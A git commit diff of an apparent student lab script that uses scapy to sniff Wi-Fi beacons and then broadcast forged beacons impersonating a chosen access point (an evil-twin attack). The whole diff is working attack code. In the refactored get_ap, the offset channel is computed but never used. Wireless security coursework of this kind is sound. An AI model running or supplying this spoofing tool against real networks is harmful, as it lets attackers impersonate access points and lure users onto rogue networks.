f92444eabedc2a71c57f7e899a0b3327d0569a60
lucas <lucas.gianinetti@heig-vd.ch>
2022-03-31 17:09:18 +0200

    modif 2_fake.py

--- 2_fake_channel_evil_tween.py
+++ 2_fake_channel_evil_tween.py
@@ -23,7 +23,6 @@ parser.add_argument("-t", "--Timeout", required=False,
 
 args = parser.parse_args()
 
-####################################
 ################## variables ##################
 
 IFACE_NAME = args.Interface
@@ -34,24 +33,17 @@ ap_list = []
 
 #Classe représentant un AP
 class AP:
-    def __init__(self, BSSID, power, SSID, channel):
+    def __init__(self, BSSID, signal, SSID, channel):
         self.BSSID = BSSID
-        self.power = power
+        self.signal = signal
         self.SSID = SSID
         self.channel = channel
 
-# Si jamais l'interface est down
-os.system("ifconfig %s up" % IFACE_NAME)
-#Launch airodump-ng en background / screen permet de ne pas afficher sur la console le process passé en argument
-#Pour le scan on se met en channel hopping afin d'en trouver un maximum.
-p = subprocess.Popen(['screen','-d','-m','airodump-ng',IFACE_NAME])
-
-####################################
 ################## fonctions ##################
 
 def PacketHandler(pkt):
     # On veut un Beacon de type Probe Request 
-    if pkt.haslayer(Dot11Beacon):
+    if pkt.haslayer(Dot11Beacon) and pkt.type == 0 and pkt.subtype == 8:
 
             #Verification de doublon
             if pkt.addr2 not in check_list: 
@@ -61,45 +53,55 @@ def PacketHandler(pkt):
                 BSSID = pkt.addr3
                 SSID = pkt.info.decode("utf-8")
                 channel = pkt.channel
-                power = pkt[0][RadioTap].Channel
+                try:
+                    signal = pkt[0][RadioTap].dBm_antiSignal
+                except:
+                    signal = "N/A"
 
                 #On met l'AP dans le tableau
-                ap_list.append(AP(BSSID ,power,SSID ,channel))
+                ap_list.append(AP(BSSID, signal, SSID, channel))
 
-def evil_tween(ssid):
+def get_ap():
+    choice = int(input("Veuillez choisir un AP à spoof:"))
+    chan = ap_list[choice].channel
+
+    # On ajoute 6 channels au channel de l'AP sélectionné
+    if chan <= 6:
+        beacon_channel = chan + 6
+    else:
+        beacon_channel = chan - 6
+
+    #Retourne l'SSID de l'ap à spoof ainsi que le channel sur lequel il devrait être lancé
+    return ap_list[choice].SSID, chan
+
+def evil_tween():
     faker = Faker()
 
-    #Préparation de la frame à envoyer#
-    #envoi de la frame en broadcast, la MAC src et la MAC de l'AP sont les mêmes et valeurs bidons
-    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=faker.mac_address(), addr3=faker.mac_address()) 
-    #Permet à l'AP d'apparaître comme sécurisé
-    beacon = Dot11Beacon(cap='ESS+privacy')
-    #SSID de l'AP à spoof
-    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
+    ssid, channel = get_ap()
 
-    #We need to add a Robust Secure Network (RSN) Information Element (IE) to our management frame.
-    rsn = Dot11Elt(ID='RSNinfo', info=(
-    '\x01\x00'              #RSN Version 1
-    '\x00\x0f\xac\x02'      #Group Cipher Suite : 00-0f-ac TKIP
-    '\x02\x00'              #2 Pairwise Cipher Suites (next two lines)
-    '\x00\x0f\xac\x04'      #AES Cipher
-    '\x00\x0f\xac\x02'      #TKIP Cipher
-    '\x01\x00'              #1 Authentication Key Managment Suite (line below)
-    '\x00\x0f\xac\x02'      #Pre-Shared Key
-    '\x00\x00'))            #RSN Capabilities (no extra capabilities)
+    #Préparation du packer à envoyer
+    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=faker.mac_address(), addr3=faker.mac_address()) #en broadcast avec comme adresses MAC src et MAC AP des adresses aléatoires identiques
+    beacon = Dot11Beacon(cap='ESS+privacy') #pour qu'il apparaisse comme sécurisé
+    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid)) #set du ssid de l'ap à spoof
+    chan = Dot11Elt(ID='DSset', info=chr(channel))    #set du channel sur lequel il sera lancé
 
-    #build de la frame
-    frame = RadioTap()/dot11/beacon/essid/rsn
+    #Build du packet
+    packet = RadioTap()/dot11/beacon/essid/chan
 
-    #Affichage de la frame
-    frame.show()
-    print("\nHexDump of frame:")
-    hexdump(frame)
+    #Affichage du packet
+    print("packet:")
+    packet.show()
 
-    #envoi de la frame en continu toutes les 0.1 secondes depuis l'interface IFACE_NAME
-    sendp(frame, iface=IFACE_NAME, inter=0.100, loop=1) 
+    #envoi des frames
+    sendp(packet, iface=IFACE_NAME, inter=0.100, loop=1)
 
-####################################
+def displayAPs(list):
+    count = 0
+    for ap in list:
+        print("%s: \t MAC: %s \t SIGNAL: %s \t CHANNEL: %s \t SSID: %s" % (
+        count, ap.BSSID, ap.signal, ap.channel, ap.SSID))
+        count += 1
+
 ################## main ##################
 
 #Représente le temps pendant lequel les paquets seront sniffés
@@ -107,31 +109,9 @@ print("Looking for APs - %s s" % timeout)
 
 #Sniff les paquets pour détecter les APs à proximité
 sniff(iface=IFACE_NAME, prn=PacketHandler, timeout=timeout)
+
 print("Liste des APs trouvés")
+displayAPs(ap_list)
 
-#Affiche la liste des APs trouvés
-count = 0
-for ap in ap_list:
-    print("%s: \t MAC: %s \t FREQUENCY: %s \t CHANNEL: %s \t SSID: %s" % (count, ap.BSSID, ap.power, ap.channel, ap.SSID))
-    count += 1
-
-#Kill airodump, on le relancer plus bas sur le bon channel de l'AP a spoof
-p.kill()
-
-choice = int(input("Veuillez choisir un AP à spoof:"))
-chan = ap_list[choice].channel
-
-#On ajoute 6 channels au channel de l'AP sélectionné
-if chan <= 6:
-    beacon_channel = chan + 6
-else:
-    beacon_channel = chan - 6
-
-#lance airodump sur le bon channel
-p = subprocess.Popen(['screen','-d','-m','airodump-ng','--channel', str(beacon_channel), IFACE_NAME])
-
-#Lancer le evil tween avec le SSID choisi par l'utilisateur
-evil_tween(ap_list[choice].SSID)
-
-#kill le subprocess
-p.kill()
+#Lancer le evil tween
+evil_tween()
